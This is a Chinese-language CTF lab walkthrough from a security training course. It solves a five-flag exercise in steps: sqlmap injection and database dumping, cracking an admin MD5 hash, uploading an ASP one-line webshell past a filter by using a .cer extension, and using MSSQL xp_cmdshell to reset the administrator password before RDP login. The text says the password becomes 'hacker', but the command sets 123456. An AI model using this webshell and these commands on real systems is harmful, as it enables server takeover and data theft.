**文章来源：知了堂冯老师原创**

![v2-eec5e37af1e4a1b398d537a7c1e7acab_hd.j](https://pic4.zhimg.com/80/v2-eec5e37af1e4a1b398d537a7c1e7acab_hd.jpg)

  

知了堂禁卫安全实验室(冯万忠.GoDun.F-原创)  
0x00 介绍  
接着上一篇，咱们继续。还是那句话，任何工具使用均来自互联网，涉及到的技术仅用于教学，不得用于非法用途，请遵守国家安全法律法规，做一个正能量的安全人员。  
试题如下：

![](http://www.zhiliaotang.net/uploads/allimg/191125/1-191125144FQ45.png)

第一步：我们访问链接：[ _http://202.0.0.23/_](http://202.0.0.23/)

![](http://www.zhiliaotang.net/uploads/allimg/191125/1-191125144I1634.png)

进入网页首页，通过浏览观察，找到[
_http://202.0.0.23/NewsList.asp?SortID=1_](http://202.0.0.23/NewsList.asp?SortID=1)7
新闻资讯页面，通过get方法提交的参数名为SortID，值为1，我们尝试一下是否存在sql注入，通过sqlmap去跑一下。

![](http://www.zhiliaotang.net/uploads/allimg/191125/1-191125144PGG.png)

![](http://www.zhiliaotang.net/uploads/allimg/191125/1-191125144RD59.png)

发现存在sql注入漏洞  
sqlmap.py -u http://202.0.0.23/Notice.asp?ItemID=17 –dbs

![](http://www.zhiliaotang.net/uploads/allimg/191125/1-191125144U1A7.png)

sqlmap.py -u http://202.0.0.23/Notice.asp?ItemID=17 -D Test_EIMS –tables

![](http://www.zhiliaotang.net/uploads/allimg/191125/1-191125144914558.png)

sqlmap.py -u http://202.0.0.23/Notice.asp?ItemID=17 -D Test_EIMS -T eims_flag
–dump

![](http://www.zhiliaotang.net/uploads/allimg/191125/1-19112514494bU.png)

查看账号密码的数据库表

![](http://www.zhiliaotang.net/uploads/allimg/191125/1-191125145012J2.png)

对b2076528346216b3进行md5解密，解密得密码为admin1234账号为root  
第二步：接下来使用御剑后台扫描，找到后台登录页面  

![](http://www.zhiliaotang.net/uploads/allimg/191125/1-191125145043U7.png)

![](http://www.zhiliaotang.net/uploads/allimg/191125/1-191125145119105.png)

右键此页面查看源码，找到一个flag：<!--flag2{890b0c4958ef57e9264a9d2703ea7e8c}-->

![](http://www.zhiliaotang.net/uploads/allimg/191125/1-19112514520L31.png)

第三步：使用账户root密码admin1234登录后台，在后台系统信息-文件上传处上传后缀为.asp的asp一句话木马，一句话木马内容：<%eval
request("caidao")%> (按照asp一句话木马格式)

![](http://www.zhiliaotang.net/uploads/allimg/191125/1-191125145339445.png)

结果提示上传文件格式不对，想下绕过办法

![](http://www.zhiliaotang.net/uploads/allimg/191125/1-191125145940441.png)

这里我们将一句话木马文件改一个可执行的后缀.cer

![](http://www.zhiliaotang.net/uploads/allimg/191125/1-191125150226352.png)

则上传成功  
第四步：下面我们直接上菜刀工具了

![](http://www.zhiliaotang.net/uploads/allimg/191125/1-191125151419339.png)

在网站根目录发现flag文件flag3{23c5b149510105853f5e7ef9a6f06627}

![](http://www.zhiliaotang.net/uploads/allimg/191125/1-191125151445103.png)

在数据库配置文件中找到数据库的账号密码

![](http://www.zhiliaotang.net/uploads/allimg/191125/1-191125151F3A1.png)

使用一句话木马连接mssql数据库

![](http://www.zhiliaotang.net/uploads/allimg/191125/1-191125151G9415.png)

利用mssql数据库的xpcmdshell组件执行系统命令 EXEC master..xp_cmdshell 'whoami'

![](http://www.zhiliaotang.net/uploads/allimg/191125/1-191125153230403.png)

当前cmdshell的权限是system权限，所以直接修改administrator的密码为hacker：EXEC master..xp_cmdshell
'net user administrator 123456'

![](http://www.zhiliaotang.net/uploads/allimg/191125/1-191125151S9232.png)

第五步：直接远程桌面连接服务器administrator/123456，在桌面发现flag文件，flag5{47baf6d9d60f40c8b1dafa56c62fcd06}

![](http://www.zhiliaotang.net/uploads/allimg/191125/1-1911251519234S.png)

![](http://www.zhiliaotang.net/uploads/allimg/191125/1-19112515194K19.png)

在c盘发现另外一个flag文件 flag4{e35a01e91e1833d266f95881ae83b4ca}

![](http://www.zhiliaotang.net/uploads/allimg/191125/1-19112515200JW.png)

至此，5个flag就找出来了，未完待续！！！

 ****

信安干货，请关注专栏：<https://zhuanlan.zhihu.com/c_1142392164838404096>

